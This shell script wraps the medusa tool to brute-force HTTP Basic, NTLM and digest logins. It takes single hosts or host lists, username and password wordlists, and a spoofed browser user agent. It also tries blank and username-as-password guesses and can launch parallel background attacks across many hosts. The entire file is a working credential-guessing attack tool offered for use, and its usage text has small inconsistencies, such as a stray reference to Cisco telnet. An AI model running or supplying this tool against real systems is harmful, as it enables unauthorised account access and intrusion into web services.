#!/bin/sh

ShowUsage() {
	echo ""
	echo "Usage: $0 [--directory=<directory>] [--hostfile=<file> | --host=<host>] [--userfile=<userfile> | --userid=<user>] <--passwordfile=<passwordfile>"
	echo "Brute force medusa wrapper for HTTP BASIC, NTLM, digest (MD5) authentication"
	echo ""
	echo "Required:"
	echo "--host=<host>]        IP address of single system to attack"
	echo "--passwordfile=<passwordfile>  Password file to use"
	echo ""
	echo "Optional:"
	echo "--hostfile=<file>     File with list of IP's to attack instead of a single host"
	echo "--directory=<directory> Directory to request (Default is /)"
	echo "--help                Usage information."
	echo ""
	echo "One of the following is required if not using Cisco telnet:"
	echo "--userid=<user>       Single user id to try"
	echo "--userfile=<userfile> File with list of usernames to attempt"
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

HOSTFILE=""
HOST=""
PASSWORDFILE=""
USERNAME=""
USERFILE=""
WEBPAGE=""
AGENTSTRING="Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7"
DIR="/"

for i in $*
do
	case $i in
	--directory=*)
		DIR=`echo $i | sed 's/[-a-zA-Z0-9]*=//'| sed "s|\"||g"`
	;;
	--host=*)
		HOST=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--hostfile=*)
		HOSTFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--passwordfile=*)
		PASSWORDFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userid=*)
		USERNAME=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userfile=*)
		USERFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--help | *)
		ShowUsage
		exit 1
	;;
	esac
done

# Sanity check...
if [ ${#HOST} -eq 0 -a ${#HOSTFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a host or a host file."
	exit 2
fi

if [ ${#USERNAME} -eq 0 -a ${#USERFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a user name or a user name file."
	exit 2
fi

if [ ${#PASSWORDFILE} -eq 0 ]; then
	echo "ERROR: Please specify a password file."
	exit 2
fi

if [ ! -e $PASSWORDFILE ]; then
	echo "ERROR: file $PASSWORDFILE could not be found."
	exit 3
fi

# Okay, now we're ready to go.

if [ ${#USERFILE} -gt 0 ]; then
	USERPARAM="-U $USERFILE"
else
	USERPARAM="-u $USERNAME"
fi

# Medusa web auth
echo "Running tests..."
# -F = stop after finding combo
# -e ns = try blank and name

if [ ${#HOSTFILE} -gt 0 ]; then
	HOSTLIST=`cat $HOSTFILE | grep -v "^$" | grep -v "^#"`
else
	HOSTLIST=$HOST
fi

NUMHOSTS=`echo "$HOSTLIST" | wc -l`

for CURHOST in $HOSTLIST
do
	OUTPUTFILE=`echo "$CURHOST.crack.web-form.txt"`
	DATESTR=`date`

	HOSTPARAM="-h $CURHOST"

	if [ $NUMHOSTS -gt 1 ]; then
		# Parallelizing scans
		echo "[$DATESTR] Spawning web auth brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Spawning web auth brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

		medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M http -e ns -F -m USER-AGENT:"$AGENTSTRING" -m DIR:$DIR > $OUTPUTFILE &
	else
		# Run single
		echo "[$DATESTR] Running web auth brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Running web auth brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

		medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M http -e ns -F -m USER-AGENT:"$AGENTSTRING" -m DIR:$DIR > $OUTPUTFILE

		DATESTR=`date`
		echo "[$DATESTR] Scan completed.  See $OUTPUTFILE for results."
		echo "[$DATESTR] Scan completed." >> $OUTPUTFILE
	fi
done

